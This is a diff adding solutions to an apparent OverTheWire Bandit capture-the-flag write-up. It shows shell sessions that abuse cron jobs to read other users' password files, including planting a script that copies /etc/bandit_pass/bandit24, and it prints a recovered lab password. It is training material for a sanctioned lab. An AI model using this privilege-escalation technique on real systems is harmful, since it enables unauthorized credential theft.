@@ -313,14 +313,87 @@ tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
 ssh -p 2220 bandit22@bandit.labs.overthewire.org
 
 ```sh
+bandit22@bandit:~$ ls -la /etc/cron.d
+total 44
+drwxr-xr-x   2 root root  4096 Jun 20 04:08 .
+drwxr-xr-x 121 root root 12288 Jun 20 21:05 ..
+-rw-r--r--   1 root root   120 Jun 20 04:07 cronjob_bandit22
+-rw-r--r--   1 root root   122 Jun 20 04:07 cronjob_bandit23
+-rw-r--r--   1 root root   120 Jun 20 04:07 cronjob_bandit24
+-rw-r--r--   1 root root   201 Apr  8 14:38 e2scrub_all
+-rwx------   1 root root    52 Jun 20 04:08 otw-tmp-dir
+-rw-r--r--   1 root root   102 Mar 31 00:06 .placeholder
+-rw-r--r--   1 root root   396 Jan  9 20:31 sysstat
+bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23
+@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh
+#!/bin/bash
 
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+bandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+8ca319486bfbbc3663ea0fbe81326349
+bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
 ```
 
 # Level 23 → Level 24
 
 ssh -p 2220 bandit23@bandit.labs.overthewire.org
 
+```sh
+bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname/foo
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+
+bandit23@bandit:~$ mkdir -p /tmp/poli
+bandit23@bandit:~$ cd /tmp/poli
+bandit23@bandit:/tmp/poli$ touch pass.sh
+bandit23@bandit:/tmp/poli$ chmod 777 pass.sh
+bandit23@bandit:/tmp/poli$ nano pass.sh
+```
+
+```sh
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/poli/pass
+```
+
+```sh
+bandit23@bandit:/tmp/poli$ chmod +rx pass.sh
+bandit23@bandit:/tmp/poli$ chmod 777 /tmp/poli
+bandit23@bandit:/tmp/poli$ touch pass
+bandit23@bandit:/tmp/poli$ chmod +rwx pass
+bandit23@bandit:/tmp/poli$ cp pass.sh /var/spool/bandit24/foo/pass.sh
+bandit23@bandit:/tmp/poli$ cat pass
+```
+
 # Level 24 → Level 25
+
+ssh -p 2220 bandit24@bandit.labs.overthewire.org
 
 # Level 25 → Level 26
 
